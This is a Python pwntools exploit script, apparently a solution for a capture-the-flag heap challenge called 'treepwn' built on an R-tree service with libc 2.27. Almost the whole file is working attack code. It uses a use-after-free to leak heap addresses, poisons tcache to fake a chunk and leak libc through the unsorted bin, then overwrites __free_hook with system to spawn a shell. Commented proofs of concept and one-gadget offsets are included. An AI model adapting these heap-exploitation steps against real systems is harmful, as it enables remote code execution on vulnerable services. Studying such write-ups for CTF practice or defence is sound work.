from secrets import choice
from tkinter.font import names
from pwn import *

context.log_level = "DEBUG"

name_size = 32

# conn = process(["ld-2.27.so", "./treepwn"],
#                env={"LD_PRELOAD": "./libc-2.27.so"})
# conn = process("./treepwn")
conn = remote("127.0.0.1", 9999)

conn.recvuntil('in 30 seconds')

powanswer = input("hashcash pow:")

conn.sendline(powanswer)

libc = ELF("./libc-2.27.so")

def choice_add(x: int, y: int, name: bytes):
    conn.sendlineafter("Your choice >", "0")
    conn.sendlineafter("coordinate value: ", str(x))
    conn.sendlineafter("coordinate value: ", str(y))
    conn.sendafter("element name: ", name)


def choice_remove(x: int, y: int):
    conn.sendlineafter("Your choice >", "1")
    conn.sendlineafter("coordinate value: ", str(x))
    conn.sendlineafter("coordinate value: ", str(y))


def choice_edit(x: int, y: int, new_name: bytes):
    conn.sendlineafter("Your choice >", "2")
    conn.sendlineafter("coordinate value: ", str(x))
    conn.sendlineafter("coordinate value: ", str(y))
    conn.sendlineafter("edited name: ", new_name)


def choice_show(x: int, y: int):
    conn.sendlineafter("Your choice >", "3")
    conn.sendlineafter("coordinate value: ", str(x))
    conn.sendlineafter("coordinate value: ", str(y))


def choice_query():
    # not used in time
    pass


def choice_leave():
    conn.sendlineafter("Your choice >", "5")


'''
POC 1

prove there is a very direct UAF,
this POC leak heap tcache address

# STEP1: fill the tree into specific format
choice_add(0, 0, b"A" * 16)
choice_add(0, 1, b"B" * 16)
choice_add(2, 0, b"C" * 16)
choice_add(2, 1, b"D" * 16)
choice_add(0, 2, b"E" * 16)
choice_add(2, 2, b"F" * 16)

# input("[DEBUG]")
## The R-Tree is like below
##       ()
##      /  \
## (A,B,E) (C,D,F) 

# STEP2: send a malicious node
# close to both child
# cause two reference here
choice_add(1, 1, b"G" * 16)

# STEP3: Free this one
choice_remove(1, 1)

# STEP4: UAF read to leak tcache header
choice_show(1, 1)

# after this how we exploit?
# learn

conn.interactive()
'''

'''
POC 2

we try to spray a fake heap on existing heap
through tcache posion


# STEP1: fill the tree into specific format
choice_add(0, 0, b"A" * 16)
choice_add(0, 1, b"B" * 16)
choice_add(2, 0, b"C" * 16)
choice_add(2, 1, b"D" * 16)
choice_add(0, 2, b"E" * 16)
choice_add(2, 2, b"F" * 16)

# input("[DEBUG]")
## The R-Tree is like below
##       ()
##      /  \
## (A,B,E) (C,D,F) 

# STEP2: send a malicious node
# close to both child
# cause two reference here

input("[ENTER]")

choice_add(1, 1, b"G" * 16)
choice_add(1, 2, b"H" * 16)

# construct tcache posion chain
choice_remove(1, 1)
choice_remove(1, 2)

choice_show(1, 2)
conn.recvuntil("found!!! its name: ", drop=True)
leak_heap = conn.recv(16)
heap_chunk_addr = u64(leak_heap[:8])
heap_tcache_addr = u64(leak_heap[8:])

print("[*] leak tcache header address:", hex(heap_tcache_addr))

# poison fd to somewhere else
# here 0xdeadbeaf
choice_edit(1, 2, p64(0xdeadbeaf) + p64(heap_tcache_addr))

# create two node will conduct SIGSEGV
choice_add(0, 3, b"I" * 16)

choice_add(0, 4, b"J" * 16)

conn.interactive()
'''

'''
EXP: take the abitary chunk to where we know 
     in the heap and do fengshui
'''

# STEP-1: make sure there are enough nodes
for i in range(32):
    choice_add(0, i * 2, b"A" * name_size)

# STEP-2: prepare tcache used nodes
#         and the UAF one

choice_add(0, 55, b"B" * name_size)  # 55 is between 54 and 56
# add suppose into two leafs
# (56, ... 62) 4 elements in the most right now
choice_remove(0, 62)
choice_remove(0, 55)

choice_show(0, 55)
conn.recvuntil("found!!! its name: ", drop=True)
leak_heap = conn.recv(name_size)
heap_chunk_addr = u64(leak_heap[:8])
heap_tcache_addr = u64(leak_heap[8:16])
print("[*] leak tcache header address:", hex(heap_tcache_addr))

# spray at node (0,0)
spray_address = heap_tcache_addr + 0x2c0 + 0x10
print("[*] fake chunk at", hex(spray_address))

choice_edit(0, 55, p64(spray_address) + p64(heap_tcache_addr) + b"\x00" * 16)

choice_edit(0, 0, p64(0) + p64(0x420 + 1) + p64(0) + p64(heap_tcache_addr))

choice_edit(0, 0x18, p64(0) + p64(0x20 + 1) + p64(0) + p64(0))
# 0x420 size will make its end just reside in
# 0 0x18

# do two allocation to spray this fake chunk
choice_add(0, 62, b"C" * name_size)
choice_add(0, 64, b"D" * name_size)

# free this huge fake chunk into unsorted bin
choice_remove(0, 64)

# we can leak the address from overlapping one
choice_show(0, 0)
conn.recvuntil("found!!! its name: ", drop=True)
leak_unsortedbin = conn.recv(name_size)
unsorted_head_addr = u64(leak_unsortedbin[0x10:0x18])

print("leak unsorted bin head:", hex(unsorted_head_addr))

unsorted_bin_offset = 0x3ebca0
libc_start = unsorted_head_addr - unsorted_bin_offset

print("hence leak libc base:", hex(libc_start))

__free_hook_addr = libc_start + libc.symbols["__free_hook"]
print("hence leak __free_hook addr:", hex(__free_hook_addr))

# 0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL

# 0x4f302 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a2fc execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
# onegadget_addr = libc_start + 0x10a2fc

system_addr = libc_start + libc.symbols["system"]
print("hence leak system addr:", hex(system_addr))


# since we have get libc, we know the where the __free_hook is
# simply adopt the tcache posion again to spray a tcache chunk to it

choice_add(0, 0x13, b"\x00" * name_size) # 19 is between 18 and 20

choice_remove(0, 0x10)
choice_remove(0, 0x13)

choice_edit(0, 0x13, p64(__free_hook_addr) + p64(heap_tcache_addr) + b"\x00" * 16)

# do two allocation to spray this fake chunk

payload = b"/bin/sh\x00"
payload += (32 - len(payload)) * b"\x00"
choice_add(0, 0x15, payload)
choice_add(0, 0x19, p64(system_addr) + b"\x00" * 24)

# free hook should be written
choice_remove(0, 0x15)

conn.interactive() 
